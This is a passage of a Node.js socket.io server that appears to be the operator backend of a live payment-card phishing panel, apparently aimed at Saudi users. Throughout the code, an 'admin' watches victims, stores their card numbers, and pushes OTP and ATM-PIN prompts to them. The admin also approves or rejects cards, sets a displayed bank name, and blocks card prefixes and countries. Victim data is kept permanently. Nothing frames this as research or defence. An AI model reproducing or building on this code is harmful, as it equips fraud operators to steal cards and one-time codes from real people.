    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page, service, amount }) => {
    io.to(visitorSocketId).emit("visitor:navigate", { page, service, amount });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If admin rejected the card, add last card number to rejectedCards list
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
          visitor.rejectedCards.push(lastCard.cardNumber);
        }
      }
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
      // Force disconnect the visitor socket(s) from the server after a short delay
      // (delay lets the 'blocked' event reach the client before the socket closes)
      const blockedVisitorId = visitor._id;
      setTimeout(() => {
        // 1) Try the exact socket id sent by admin
        const targetSocket = io.sockets.sockets.get(visitorSocketId);
        if (targetSocket) {
          targetSocket.emit("blocked");
          targetSocket.disconnect(true);
          console.log(`Visitor socket force-disconnected (direct): ${visitorSocketId}`);
        }
        // 2) Also disconnect ANY socket that belongs to the same visitor _id
        //    (covers the case where the visitor reconnected with a new socket id)
        visitors.forEach((v, sid) => {
          if (v._id === blockedVisitorId) {
            v.isBlocked = true;
            const s = io.sockets.sockets.get(sid);
            if (s) {
              s.emit("blocked");
              s.disconnect(true);
              console.log(`Visitor socket force-disconnected (by _id): ${sid}`);
            }
          }
        });
      }, 500);
    } else {
      // Visitor not in active map (maybe reconnected with new socket). Block by _id if found in saved list.
      const saved = savedVisitors.find(v => v.socketId === visitorSocketId);
      if (saved) {
        saved.isBlocked = true;
        saveData();
        const blockedId = saved._id;
        visitors.forEach((v, sid) => {
          if (v._id === blockedId) {
            v.isBlocked = true;
            const s = io.sockets.sockets.get(sid);
            if (s) { s.emit("blocked"); setTimeout(() => s.disconnect(true), 500); }
          }
        });
      }
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    // Find the visitor's stable _id. It may be in the active Map (by socket id)
    // or only in the saved list (if the socket was disconnected on block).
    let targetId = null;
    const activeVisitor = visitors.get(visitorSocketId);
    if (activeVisitor) {
      targetId = activeVisitor._id;
    } else {
      const savedBySocket = savedVisitors.find(v => v.socketId === visitorSocketId);
      if (savedBySocket) targetId = savedBySocket._id;
    }

    if (!targetId) {
      console.log(`Unblock: visitor not found for ${visitorSocketId}`);
      return;
    }

    // 1) Clear isBlocked on ALL active sockets that belong to this visitor _id
    visitors.forEach((v, sid) => {
      if (v._id === targetId) {
        v.isBlocked = false;
        visitors.set(sid, v);
        io.to(sid).emit("unblocked");
      }
    });

    // 2) Clear isBlocked on the saved (permanent) copy so a future reconnect
    //    after a page refresh is allowed to become active again.
    const savedVisitor = savedVisitors.find(v => v._id === targetId);
    if (savedVisitor) {
      savedVisitor.isBlocked = false;
    }
    saveData();

    // Also emit to the original socket id in case it is still around
    io.to(visitorSocketId).emit("unblocked");
    console.log(`Visitor unblocked (_id ${targetId}): ${visitorSocketId}`);
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Force logout the password changer too after a delay
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    // Find visitor by ID in active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// Idle check timer - every 10 seconds, check for visitors idle > 30 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
